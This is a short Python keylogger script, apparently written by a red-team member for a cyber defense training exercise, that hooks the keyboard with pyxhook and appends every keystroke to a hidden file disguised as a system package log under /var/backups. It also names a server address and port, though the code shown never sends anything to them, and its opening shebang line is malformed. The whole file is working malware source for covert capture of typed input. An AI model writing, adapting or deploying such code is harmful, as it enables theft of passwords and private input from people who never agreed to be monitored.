# Dean Maxwell
# CDT Spring 2023
# Alpha Team

!#/usr/bin/env python3
import os
import pyxhook

# Hard
server = "10.0.4.8"
port = 8080

# Tells the keylogger where the log file will go.
file = os.environ.get(
	'pylogger_file',
	os.path.expanduser('/var/backups/.dpkg.log')
)

# Set the cancel key from environment args
cancel_key = ord(
	os.environ.get(
		'pylogger_cancel',
		'`'
	)[0]
)

# Clear the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
	try:
		os.remove(file)
	except EnvironmentError:
	# File does not exist, or no permissions.
		pass

# Creating key pressing event and saving it into log file
def OnKeyPress(event):
	with open(file, 'a') as f:
		f.write('{}\n'.format(event.Key))

# Create a hook manager object
hook1 = pyxhook.HookManager()
hook1.KeyDown = OnKeyPress

# set the hook
hook1.HookKeyboard()
try:
    # Start the hook
	hook1.start()
except KeyboardInterrupt:
	# User cancelled from command line.
	pass
except Exception as ex:
	# Write exceptions to the log file, for analysis later.
	msg = 'Error while catching events:\n {}'.format(ex)
	pyxhook.print_err(msg)
	with open(file, 'a') as f:
		f.write('\n{}'.format(msg))
